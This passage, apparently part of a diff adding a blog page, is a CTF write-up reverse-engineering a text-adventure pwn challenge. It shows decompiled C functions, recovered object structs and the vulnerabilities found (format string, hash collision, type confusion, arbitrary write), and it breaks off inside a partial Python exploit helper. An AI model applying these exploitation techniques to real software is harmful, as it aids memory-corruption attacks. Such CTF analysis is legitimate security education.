+  <span class="k">if</span> <span class="p">(</span> <span class="n">can_move</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"You move %s.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">direction</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Ugh... you can't move that way you muppet!"</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<h2 id="action_use">action_use</h2>
+
+<p>This select the type of object depending on the obj_desc and then use it.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="code"><pre>        <span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">action_use</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">obj_desc</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+          <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx_obj</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]</span>
+          <span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="n">found_object</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
+
+          <span class="k">for</span> <span class="p">(</span> <span class="n">idx_obj</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">idx_obj</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">idx_obj</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="n">printf</span><span class="p">(</span><span class="s">"Use a %s? WAT?!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">);</span>
+              <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+            <span class="p">}</span>
+<span class="cm">/* 1 */</span>     <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">desc</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">)</span> <span class="p">)</span>
+              <span class="k">break</span><span class="p">;</span>
+          <span class="p">}</span>
+<span class="cm">/* 2 */</span>   <span class="n">found_object</span> <span class="o">=</span> <span class="n">get_matched_object</span><span class="p">(</span><span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">type</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">,</span> <span class="s">"use"</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">found_object</span> <span class="p">)</span>
+<span class="cm">/* 3 */</span>     <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="p">)((</span><span class="n">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">use_object</span><span class="p">)(</span>
+                                                  <span class="n">found_object</span><span class="p">,</span>
+                                                  <span class="n">obj_desc</span><span class="p">);</span>
+          <span class="k">else</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>It finds an idx_obj depending on the object we asked for when submitting our command</li>
+  <li>It finds our object</li>
+  <li>It uses a function pointer contained in the object virtual functions table. That is how objects get specialized. A virtual functions table is an array of functions pointers or a structure containing callbacks corresponding to “actions” for our object.</li>
+</ol>
+
+<h2 id="action_get">action_get</h2>
+
+<p>This allows us to take an object from a room.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+</pre></td><td class="code"><pre>    <span class="kt">signed</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">action_get</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">object_name</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">obj_hash</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-124h]</span>
+      <span class="k">struct</span> <span class="n">bullet_obj</span> <span class="o">*</span><span class="n">found_object</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-120h]</span>
+      <span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="n">inventory</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-118h]</span>
+      <span class="kt">char</span> <span class="n">obj_desc</span><span class="p">[</span><span class="mi">264</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-110h]</span>
+      <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">stack_cookie</span><span class="p">;</span> <span class="c1">// [rsp+138h] [rbp-8h]</span>
+
+      <span class="n">stack_cookie</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"There's nothing in here, you turd popsickle!"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">,</span> <span class="n">object_name</span><span class="p">)</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"You're trying to get something that doesn't exist. Well done!"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">count</span> <span class="p">)</span>
+      <span class="p">{</span>
+<span class="cm">/* 1 */</span> <span class="n">found_object</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">bullet_obj</span> <span class="o">*</span><span class="p">)</span><span class="n">find_item_by_type</span><span class="p">(</span><span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">found_object</span> <span class="o">||</span> <span class="n">found_object</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">OBJECT_BULLET</span> <span class="o">&amp;&amp;</span> <span class="n">found_object</span><span class="o">-&gt;</span><span class="n">is_ready</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"What secret name shall we give this %s? &gt; "</span><span class="p">,</span> <span class="n">object_name</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">obj_desc</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Fine!"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="n">obj_desc</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">obj_desc</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">obj_desc</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Nope, name long enough."</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="p">}</span>
+<span class="cm">/* 2 */</span>   <span class="n">obj_hash</span> <span class="o">=</span> <span class="n">create_hash</span><span class="p">(</span><span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">find_item_by_hash</span><span class="p">(</span><span class="n">obj_hash</span><span class="p">)</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Already got an item with that id!"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="n">inventory</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">inventory_struct</span> <span class="o">*</span><span class="p">)((</span><span class="n">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">_QWORD</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">constructor</span><span class="p">)(</span>
+                                                   <span class="n">obj_hash</span><span class="p">,</span>
+                                                   <span class="n">obj_desc</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">inventory</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Seems like we're all outta mem!"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="p">}</span>
+<span class="cm">/* 3 */</span>   <span class="n">inventory</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">;</span>
+          <span class="n">inventory</span><span class="o">-&gt;</span><span class="n">desc</span> <span class="o">=</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">;</span>
+          <span class="n">inventory</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">=</span> <span class="n">obj_hash</span><span class="p">;</span>
+          <span class="n">inventory</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">stuff</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">stuff</span> <span class="p">)</span>
+            <span class="n">stuff</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">inventory</span><span class="p">;</span>
+          <span class="n">stuff</span> <span class="o">=</span> <span class="n">inventory</span><span class="p">;</span>
+          <span class="o">--</span><span class="n">current_room</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span>
+          <span class="n">printf</span><span class="p">(</span>
+            <span class="s">"You sureptitiously acquire a single %s, we've given it the secret hash of 0x%08X.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+            <span class="n">object_name</span><span class="p">,</span>
+            <span class="n">obj_hash</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Sorry, but you've already got a %s.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">object_name</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"You've already picked up all of the %s.</span><span class="se">\n</span><span class="s">."</span><span class="p">,</span> <span class="n">object_name</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+    <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>We can find objects by type</li>
+  <li>We can find objects by hash</li>
+  <li>This shows that all our objects are linked between themselves and they probably have the same structure at the beginning</li>
+</ol>
+
+<h1 id="objects">Objects</h1>
+
+<p>There are 2 structures for objects:</p>
+
+<ul>
+  <li>Kinds</li>
+  <li>Items</li>
+</ul>
+
+<h2 id="kinds">Kinds</h2>
+
+<p>This is what the table of object kinds/headers looks like:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.data:00000000002050C0 ; struct object_struct all_objects[5]
+.data:00000000002050C0 all_objects     dq 0                    ; DATA XREF: create_hash+24↑o
+.data:00000000002050C0                                         ; use_revolver+FF↑o ...
+.data:00000000002050C8                 dq offset aRevolver     ; "Revolver"
+.data:00000000002050D0                 dd 1
+.data:00000000002050D4                 dd 0FFD1CC90h
+.data:00000000002050D8                 dq offset create_revolver
+.data:00000000002050E0                 dq offset use_revolver
+.data:00000000002050E8                 dq offset hidden_detail_revolver
+.data:00000000002050F0 bullet_object   dq 1                    ; DATA XREF: .data:0000000000205210↓o
+.data:00000000002050F8                 dq offset aBullet       ; "Bullet"
+.data:0000000000205100                 dd 3
+.data:0000000000205104                 dd 0A060E1B3h
+.data:0000000000205108                 dq offset create_bullet
+.data:0000000000205110                 dq offset use_bullet
+.data:0000000000205118                 dq offset hidden_detail_bullet
+.data:0000000000205120 tissue_object   dq 2                    ; DATA XREF: .data:0000000000205240↓o
+.data:0000000000205128                 dq offset aTissue       ; "Tissue"
+.data:0000000000205130                 dd 1
+.data:0000000000205134                 dd 0A17B609h
+.data:0000000000205138                 dq offset create_tissue
+.data:0000000000205140                 dq offset use_tissue
+.data:0000000000205148                 dq offset hidden_detail_tissue
+.data:0000000000205150 glass_object    dq 3                    ; DATA XREF: .data:00000000002052A0↓o
+.data:0000000000205158                 dq offset aMagnifyingglas ; "MagnifyingGlass"
+.data:0000000000205160                 dd 1
+.data:0000000000205164                 dd 55754F83h
+.data:0000000000205168                 dq offset create_magnifyingglass
+.data:0000000000205170                 dq offset use_magnifyingglass
+.data:0000000000205178                 dq offset hidden_detail_magnifyingglass
+.data:0000000000205180 target_object   dq 4                    ; DATA XREF: .data:00000000002052D0↓o
+.data:0000000000205188                 dq offset aTarget       ; "Target"
+.data:0000000000205190                 dd 1
+.data:0000000000205194                 dd 7D90DD54h
+.data:0000000000205198                 dq offset create_target
+.data:00000000002051A0                 dq offset use_target
+.data:00000000002051A8                 dq offset hidden_detail_target</code></pre></figure>
+
+<p>This array of object headers and the reversing of the function create_hash() allow us to get the following structure:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">00000000 object_struct   struc ; (sizeof=0x30, mappedto_5)
+00000000                                         ; XREF: use_bullet+C/o
+00000000 type            dq ?                    ; XREF: create_hash+3A/r
+00000000                                         ; find_item_by_type+E/r ...
+00000008 desc            dq ?                    ; XREF: find_item_by_type+2D/r
+00000008                                         ; action_get+58/r ... ; offset
+00000010 count           dd ?                    ; XREF: find_item_by_type+1B/r
+00000010                                         ; action_get+96/r ...
+00000014 hash            dd ?
+00000018 constructor     dq ?                    ; XREF: action_get+21B/r ; offset
+00000020 use_object      dq ?                    ; offset
+00000028 hidden_detail   dq ?                    ; offset
+00000030 object_struct   ends</code></pre></figure>
+
+<p>create_hash() function will be detailed later in the vulnerability analysis section.</p>
+
+<h2 id="items">Items</h2>
+
+<p>After some reversing (action_* and create_* functions), we end up with the following items.
+Each of these items are linked between them to constitute the inventory.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">00000000 inventory_struct struc ; (sizeof=0x28, mappedto_8)
+00000000                                         ; XREF: use_bullet+C/o
+00000000 prev            dq ?                    ; XREF: action_get+2C9/w ; offset
+00000008 next            dq ?                    ; XREF: action_get+2A5/w
+00000008                                         ; action_inventory+58/r ; offset
+00000010 type            dd ?                    ; XREF: action_get+EC/r
+00000010                                         ; action_get+264/w
+00000014 hash            dd ?                    ; XREF: action_get+291/w
+00000018 desc            dq ?                    ; XREF: action_get+280/w ; offset
+00000020 private_data    dq ?                    ; offset
+00000028 inventory_struct ends
+00000028
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 target_obj      struc ; (sizeof=0x68, mappedto_9)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?                    ; base 2
+00000020 target_name     dq ?                    ; XREF: create_target+38/w ; offset
+00000028 detail          db 64 dup(?)
+00000068 target_obj      ends
+00000068
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 revolver_obj    struc ; (sizeof=0x70, mappedto_10)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?                    ; offset
+00000020 bullet          dq ?                    ; XREF: use_revolver+36/r
+00000020                                         ; use_revolver+18C/r ... ; offset
+00000028 serial_number   dq ?                    ; XREF: create_revolver+126/w
+00000030 detail          db 64 dup(?)
+00000070 revolver_obj    ends
+00000070
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 bullet_obj      struc ; (sizeof=0x78, mappedto_11)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?
+00000020 serial_number   dq ?                    ; XREF: use_bullet+5C/w
+00000020                                         ; use_bullet+64/r ...
+00000028 mark            dq ?                    ; XREF: create_bullet+170/r
+00000028                                         ; create_bullet+1A0/r ... ; offset
+00000030 detail          db 64 dup(?)
+00000070 is_ready        dq ?                    ; XREF: use_bullet+68/w
+00000070                                         ; action_get+FB/r
+00000078 bullet_obj      ends
+00000078
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 tissue_obj      struc ; (sizeof=0x60, mappedto_12)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?
+00000020 detail          db 64 dup(?)
+00000060 tissue_obj      ends
+00000060
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 magnifying_glass_obj struc ; (sizeof=0x68, mappedto_13)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?
+00000020 is_clean        dq ?                    ; XREF: use_tissue+38/r
+00000020                                         ; use_tissue+58/w ...
+00000028 detail          db 64 dup(?)
+00000068 magnifying_glass_obj ends</code></pre></figure>
+
+<h1 id="vulnerability-hunting">Vulnerability hunting</h1>
+
+<p>For the vulnerability hunting phase, since it’s a challenge, we’ll go after the usual common culprits:</p>
+<ul>
+  <li>buffer overflow</li>
+  <li>format string</li>
+  <li>heap overflow off-by-one</li>
+  <li>use-after-free</li>
+</ul>
+
+<h2 id="findings">Findings</h2>
+
+<p>After reversing a couple of functions, we end up finding 4 vulnerabilities:</p>
+
+<ul>
+  <li>format string</li>
+  <li>an easily collisionable hash function</li>
+  <li>type confusion</li>
+  <li>arbitrary write 16 bytes thanks to the type confusion</li>
+</ul>
+
+<h2 id="format-string">Format string</h2>
+
+<p>This function is called when we use the MagnifyingGlass object.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+</pre></td><td class="code"><pre>        <span class="kt">signed</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">use_magnifyingglass</span><span class="p">(</span><span class="k">struct</span> <span class="n">magnifying_glass_obj</span> <span class="o">*</span><span class="n">cur_item</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="cm">/* ... */</span>
+<span class="cm">/* 1 */</span>   <span class="k">if</span> <span class="p">(</span> <span class="n">cur_item</span><span class="o">-&gt;</span><span class="n">is_clean</span> <span class="p">)</span>
+          <span class="p">{</span>
+<span class="cm">/* 2 */</span>     <span class="k">if</span> <span class="p">(</span> <span class="n">current_room</span> <span class="o">==</span> <span class="n">study</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="cm">/* ... */</span>
+<span class="cm">/* 3 */</span>       <span class="n">printf</span><span class="p">(</span><span class="s">"What kind of object do you want to look at? &gt; "</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">(</span> <span class="n">fgets</span><span class="p">(</span><span class="n">obj_name</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
+              <span class="p">{</span>
+                <span class="n">obj_name</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">obj_name</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                <span class="k">for</span> <span class="p">(</span> <span class="n">idx_obj</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">idx_obj</span> <span class="p">)</span>
+                <span class="p">{</span>
+                  <span class="k">if</span> <span class="p">(</span> <span class="n">idx_obj</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+                    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+                  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">desc</span><span class="p">,</span> <span class="n">obj_name</span><span class="p">)</span> <span class="p">)</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+<span class="cm">/* 4 */</span>         <span class="n">found_object</span> <span class="o">=</span> <span class="n">get_matched_object</span><span class="p">(</span><span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">type</span><span class="p">,</span> <span class="n">obj_name</span><span class="p">,</span> <span class="s">"inspect"</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span> <span class="n">found_object</span> <span class="p">)</span>
+                <span class="p">{</span>
+                  <span class="n">printf</span><span class="p">(</span><span class="s">"OK, you asked for the %s detail, here it is:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">desc</span><span class="p">);</span>
+<span class="cm">/* 5 */</span>           <span class="n">obj_detail</span> <span class="o">=</span> <span class="n">all_objects</span><span class="p">[</span><span class="n">idx_obj</span><span class="p">].</span><span class="n">hidden_detail</span><span class="p">(</span><span class="n">found_object</span><span class="p">);</span>
+<span class="cm">/* 6 */</span>           <span class="n">printf</span><span class="p">(</span><span class="n">obj_detail</span><span class="p">);</span>
+<span class="cm">/* 7 */</span>           <span class="n">cur_item</span><span class="o">-&gt;</span><span class="n">is_clean</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+                  <span class="n">result</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">else</span>
+                <span class="p">{</span>
+                  <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+                <span class="p">}</span>
+              <span class="p">}</span>
+              <span class="k">else</span>
+              <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Fine!"</span><span class="p">);</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+              <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+              <span class="n">printf</span><span class="p">(</span><span class="s">"Inspecting something while in the %s? Noob.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_room</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+              <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">else</span>
+          <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"You can't use a magnifying glass that is filthy dirty! Fool."</span><span class="p">);</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+        <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>The MagnifyingGlass needs to be cleaned before using it. We need to use a Tissue before using it.
+As long as is_clean is different than 0, then the MagnifyingGlass is considered clean.</li>
+  <li>We need to be in the study room</li>
+  <li>We choose the object we want to look at, that’s it’s detail that’s going to be used for the format string</li>
+  <li>It looks for the object we requested</li>
+  <li>The object hidden detail is returned but we don’t control it (yet)</li>
+  <li>The detail is used directly! It’s a format string. We need to find a way of controlling that input.</li>
+  <li>is_clean is resetted to 0 so the format string can’t be used anymore (there is only 1 tissue by default)</li>
+</ol>
+
+<h2 id="hash-collision">Hash collision</h2>
+
+<p>The create_hash() function is collisionable ;).
+A hash collision is when 2 sequences of bytes hash to the same value.</p>
+
+<p>Here is the reconstructed code in Python.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td><td class="code"><pre><span class="k">class</span> <span class="nc">Pwner</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">'Revolver'</span>          <span class="p">:</span> <span class="mh">0xFFD1CC90</span><span class="p">,</span>
+            <span class="s">'Bullet'</span>            <span class="p">:</span> <span class="mh">0xA060E1B3</span><span class="p">,</span>
+            <span class="s">'Tissue'</span>            <span class="p">:</span> <span class="mh">0x0A17B609</span><span class="p">,</span>
+            <span class="s">'MagnifyingGlass'</span>   <span class="p">:</span> <span class="mh">0x55754F83</span><span class="p">,</span>
+            <span class="s">'Target'</span>            <span class="p">:</span> <span class="mh">0x7D90DD54</span><span class="p">,</span>
+        <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">create_hash</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj_desc</span><span class="p">,</span> <span class="n">obj_name</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">obj_desc</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">ValueError</span> <span class="p">(</span><span class="s">"Object Description doesn't exist"</span><span class="p">)</span>
+
+        <span class="n">initial_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj_magic</span><span class="p">[</span><span class="n">obj_desc</span><span class="p">]</span>
+
+        <span class="n">hashed</span> <span class="o">=</span> <span class="n">initial_hash</span>                                   <span class="c1"># 1
+</span>        <span class="k">for</span> <span class="n">idx_name</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="nb">len</span> <span class="p">(</span><span class="n">obj_name</span><span class="p">)):</span>
+            <span class="n">byte</span> <span class="o">=</span> <span class="n">get_byte</span> <span class="p">(</span><span class="n">initial_hash</span><span class="p">,</span> <span class="n">idx_name</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
